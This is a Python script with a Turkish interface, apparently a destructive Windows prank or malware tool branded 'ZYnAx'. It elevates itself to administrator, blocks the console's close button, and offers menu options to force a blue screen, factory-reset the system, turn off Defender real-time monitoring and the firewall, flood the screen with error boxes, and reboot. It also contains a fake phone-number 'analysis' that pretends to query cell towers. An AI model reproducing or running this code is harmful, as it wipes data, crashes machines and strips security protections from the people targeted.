import os
import sys
import time
import ctypes
import threading
import json
import random
from urllib.request import urlopen

# --- RENKLER ---
R, G, Y, B, C, W, RES = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[96m", "\033[97m", "\033[0m"
os.system("") 

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- ALT+F4 VE X TUSU KILIDI ---
def anti_close():
    while True:
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            hMenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
            ctypes.windll.user32.DeleteMenu(hMenu, 0xF060, 0x0000)
            time.sleep(0.1)
        except: pass

# --- MODULLER ---

def numara_sorgu_beta():
    clear()
    print(f"{Y}" + "—"*55)
    print(f"\t{R}[!] ZYnAx GLOBAL SEARCH - BETA PHASE [!]{RES}")
    print(f"{Y}" + "—"*55 + f"{RES}")
    num = input(f"\n{C}[?] Analiz Edilecek Numara (05xx...): {RES}")
    print(f"\n{W}[*] Sinyal kuleleri taranıyor...")
    time.sleep(1.5)
    print(f"\n{Y}┌────────────────────────────────────────────────────────┐")
    print(f"│  {R}UYARI: SİSTEM ŞU AN DENEME (BETA) AŞAMASINDADIR.     {Y}│")
    print(f"│  {W}Veritabanı optimizasyonu devam etmektedir.           {Y}│")
    print(f"└────────────────────────────────────────────────────────┘{RES}")
    op = "TURKCELL" if num.startswith(("053", "53")) else "VODAFONE" if num.startswith(("054", "54")) else "TURK TELEKOM"
    print(f"\n{G}[+] ANALİZ SONUÇLARI:{RES}\n{C}—"*40)
    print(f"{W}HEDEF NUMARA : {Y}{num}\n{W}OPERATÖR     : {Y}{op}\n{W}KİMLİK VERİSİ: {R}[BETA SÜRECİNDE ERİŞİME KAPALI]{RES}\n{C}—"*40)
    input(f"\n{G}Ana menüye dönmek için ENTER...{RES}")

def infinite_window_bomb():
    print(f"{R}[!] SONSUZ BOMBALAMA ARKA PLANDA BASLATILDI...{RES}")
    def trigger():
        while True:
            titles = ["ZYN_AX FATAL", "CRITICAL ERROR", "0x00052", "SYSTEM FAILURE"]
            msgs = ["SISTEM ELE GECIRILDI!", "KAPATAMAZSIN!", "ZYnAx INJECTED!", "ERZURUM 25!"]
            ctypes.windll.user32.MessageBoxW(0, random.choice(msgs), random.choice(titles), 0x10 | 0x0)
            time.sleep(0.1) # PC cokmesin diye cok kucuk es
    for _ in range(5): # 5 ayri koldan sonsuz firlat
        threading.Thread(target=trigger, daemon=True).start()
    time.sleep(2)

def show_ip_details():
    clear()
    print(f"\n{C}[*] SISTEM ANALIZ EDILIYOR...{RES}\n")
    try:
        data = json.loads(urlopen("http://ip-api.com/json/", timeout=5).read().decode())
        print(f"{Y}DEGERLER".ljust(15) + f"VERI{RES}\n" + "—"*45)
        fields = {"IP": "query", "ULKE": "country", "SEHIR": "city", "ISS": "isp", "LAT/LON": "lat"}
        for k, v in fields.items():
            print(f"{C}{k.ljust(15)}:{RES} {data.get(v)}")
    except: print(f"{R}[!] Veri alınamadı.{RES}")
    input("\nENTER...")

# --- ANA MENU ---
def main_menu():
    clear()
    print(f"{C}" + r"""
  ________                     _____       ____  ___
  \_____  \  ___.__.  ____    /  _  \      \   \/  /
   /   |   \<   |  | /    \  /  /_\  \      \     / 
  /    |    \ \___  ||   |  \/    |    \     /     \ 
  \_______  / / ____||___|  /\____|__  /    /___/\  \ 
          \/  \/          \/         \/           \_/ 
    """ + f"{RES}")
    print(f"\t{R}[!] KERNEL AKTIF | ALT+F4: BLOKE{RES}")
    print(f"{C}—"*75 + f"{RES}")
    print(f" [01] {Y}IP / SISTEM ANALIZI{RES}       [06] {R}BIOS'A ZORLA (REBOOT){RES}")
    print(f" [02] {Y}NUMARA SORGU (BETA){RES}       [07] {R}INFINITE WINDOW BOMB{RES}")
    print(f" [03] {R}MAVI EKRAN (BSOD){RES}          [08] {R}GUVENLIK DUVARI OFF{RES}")
    print(f" [04] {R}SISTEMI SIFIRLA (HARD){RES}     [09] {R}SONSUZ REBOOT LOOP{RES}")
    print(f" [05] {B}YENIDEN BASLAT{RES}            [10] {C}PROGRAMDAN CIKIS{RES}")
    print(f"{C}—"*75 + f"{RES}")

    ch = input(f"\n {B}{C}ZYnAx_ROOT > {RES}")

    if ch == "1": show_ip_details(); main_menu()
    elif ch == "2": numara_sorgu_beta(); main_menu()
    elif ch == "3":
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    elif ch == "4": os.system("systemreset -factoryreset")
    elif ch == "5": os.system("shutdown /r /t 0")
    elif ch == "6": os.system("shutdown /r /fw /t 0")
    elif ch == "7": infinite_window_bomb(); main_menu()
    elif ch == "8":
        os.system("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
        os.system("netsh advfirewall set allprofiles state off"); main_menu()
    elif ch == "9": os.system("shutdown /r /t 0")
    elif ch == "10": sys.exit()
    else: main_menu()

if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    threading.Thread(target=anti_close, daemon=True).start()
    
    for i in range(5, 0, -1):
        clear()
        print(f"\n\n\n\t\t{R}[ ZYnAx GLOBAL INFECTION ]{RES}")
        print(f"\t\t{Y}>> KERNEL ERISIMI: %{100-(i*20)}")
        time.sleep(0.4)
    
    main_menu()